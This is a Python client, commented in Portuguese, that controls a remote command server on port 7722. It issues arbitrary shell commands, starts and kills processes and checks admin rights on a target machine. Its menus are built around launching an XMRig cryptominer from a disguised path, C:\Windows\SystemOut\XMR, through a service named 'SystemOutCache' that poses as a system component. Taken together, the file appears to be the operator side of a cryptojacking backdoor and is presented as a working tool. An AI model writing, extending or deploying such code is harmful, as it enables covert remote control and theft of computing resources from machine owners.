#!/usr/bin/env python3
import socket
import time

PORT = 7722  # Porta fixa do servidor

def send_command(host, port, command):
    """Envia um comando ao servidor e retorna a resposta."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(15)  # Timeout aumentado para 15 segundos
            s.connect((host, port))
            s.sendall(command.encode('utf-8'))
            output = ""
            while True:
                data = s.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                output += data
                # Para comandos que podem ter saída contínua
                if '[PROCESS ENDED]' in data:
                    break
            return output
    except ConnectionRefusedError:
        return "[ERRO] Não foi possível conectar ao servidor."
    except socket.timeout:
        return "[ERRO] Timeout: o servidor não respondeu a tempo."
    except Exception as e:
        return f"[ERRO] Falha na comunicação: {str(e)}"

def print_banner():
    print("=" * 90)
    print(" " * 25 + "CLIENTE DE CONTROLE REMOTO MELHORADO")
    print("=" * 90)
    print("COMANDOS BÁSICOS:")
    print("  EXEC:<comando>           - Executa comando e retorna saída")
    print("  START:<comando>          - Inicia processo")
    print("  STOP:<id>                - Para processo por ID")
    print("  LIST                     - Lista processos controlados")
    print()
    print("COMANDOS AVANÇADOS:")
    print("  STOPNAME:<nome>          - Para TODOS os processos com nome específico")
    print("  FIND:<nome>              - Encontra processos por nome")
    print("  PROCESSES                - Lista todos os processos do sistema")
    print("  ADMIN                    - Verifica privilégios de administrador")
    print()
    print("COMANDOS PARA TERMINAL VISÍVEL:")
    print("  TERMINAL:<comando>       - Abre nova janela do terminal")
    print("  STARTCMD:<comando>       - Executa via cmd start")
    print()
    print("EXEMPLOS PARA XMRIG COM TERMINAL VISÍVEL:")
    print(f'  TERMINAL:C:\\Windows\\SystemOut\\XMR\\xmrig.exe')
    print(f'  STARTCMD:"C:\\Windows\\SystemOut\\XMR\\xmrig.exe"')
    print("  Para parar: STOPNAME:xmrig")
    print("=" * 90)

def show_quick_commands():
    print("\nCOMANDOS RÁPIDOS:")
    print("1. Iniciar XMRig silencioso")
    print("2. Iniciar XMRig COM TERMINAL VISÍVEL (TERMINAL)")
    print("3. Iniciar XMRig COM TERMINAL VISÍVEL (STARTCMD)")
    print("4. Parar todos os XMRig")
    print("5. Listar processos XMRig")
    print("6. Verificar privilégios admin")
    print("7. Listar processos controlados")
    print("0. Menu principal")

def handle_quick_command(choice, host):
    commands = {
        '1': r'START:"C:\Windows\SystemOut\XMR\xmrig.exe"',
        '2': r'TERMINAL:C:\Windows\SystemOut\XMR\xmrig.exe',
        '3': r'STARTCMD:"C:\Windows\SystemOut\XMR\xmrig.exe"',
        '4': 'STOPNAME:xmrig',
        '5': 'FIND:xmrig',
        '6': 'ADMIN',
        '7': 'LIST'
    }
    
    if choice in commands:
        print(f"\nExecutando: {commands[choice]}")
        response = send_command(host, PORT, commands[choice])
        print(response)
        return True
    return False

def test_connection(host, port):
    """Testa se consegue conectar ao servidor"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            result = s.connect_ex((host, port))
            return result == 0
    except:
        return False

def main():
    print_banner()
    
    # Solicita o IP do servidor ao usuário
    while True:
        host = input("\nDigite o IP do servidor (ou Enter para localhost): ").strip()
        if not host:
            host = 'localhost'
            print(f"Usando host padrão: {host}")
        
        print(f"\nTestando conexão com {host}:{PORT}...")
        
        # Testa conexão básica primeiro
        if test_connection(host, PORT):
            print("✓ Conexão TCP estabelecida com sucesso!")
            break
        else:
            print("✗ Falha na conexão TCP")
            print(f"Verifique se:")
            print(f"  1. O servidor está rodando em {host}:{PORT}")
            print(f"  2. O firewall não está bloqueando a porta {PORT}")
            print(f"  3. O IP está correto")
            
            retry = input("\nTentar novamente? (s/n): ").strip().lower()
            if retry != 's':
                return
    
    # Testa comando inicial
    print("Testando comunicação com o servidor...")
    test_response = send_command(host, PORT, "ADMIN")
    
    if "[ERRO]" in test_response:
        print(f"\n🛑 ERRO CRÍTICO: {test_response}")
        print("-" * 50)
        print("DIAGNÓSTICO POSSÍVEL:")
        print("1. O Serviço 'SystemOutCache' NÃO está rodando na máquina alvo.")
        print("   -> Na VM, abra o Gerenciador de Tarefas e procure 'SystemOutCache.exe'.")
        print("   -> Ou rode no Powershell da VM: Get-Service SystemOutCache")
        print("2. O Firewall bloqueou a porta 7722.")
        print("3. O IP mudou ou está inacessível.")
        print("-" * 50)
        return
    else:
        print(f"✓ Comunicação bem-sucedida! {test_response.strip()}")
    
    while True:
        try:
            print("\n" + "-" * 50)
            print("Opções:")
            print("  Digite um comando diretamente")
            print("  Digite 'quick' para comandos rápidos")
            print("  Digite 'help' para ver todos os comandos")
            print("  Digite 'quit' para sair")
            
            cmd = input("\n> ").strip()
            
            if cmd.lower() == 'quit':
                print("Encerrando cliente...")
                break
            elif cmd.lower() == 'help':
                print_banner()
                continue
            elif cmd.lower() == 'quick':
                while True:
                    show_quick_commands()
                    quick_choice = input("\nEscolha uma opção (0-7): ").strip()
                    if quick_choice == '0':
                        break
                    elif handle_quick_command(quick_choice, host):
                        input("\nPressione Enter para continuar...")
                    else:
                        print("Opção inválida!")
                continue
            elif not cmd:
                print("[ERRO] Comando vazio.")
                continue
            
            # Mostra o comando que será executado
            print(f"\nExecutando: {cmd}")
            start_time = time.time()
            
            # Envia o comando e exibe a resposta
            response = send_command(host, PORT, cmd)
            end_time = time.time()
            
            print(f"\nResposta (tempo: {end_time - start_time:.2f}s):")
            print("-" * 40)
            print(response)
            print("-" * 40)
            
        except KeyboardInterrupt:
            print("\n[INFO] Interrupção pelo usuário. Encerrando...")
            break
        except Exception as e:
            print(f"[ERRO] Erro no cliente: {str(e)}")

if __name__ == "__main__":
    main()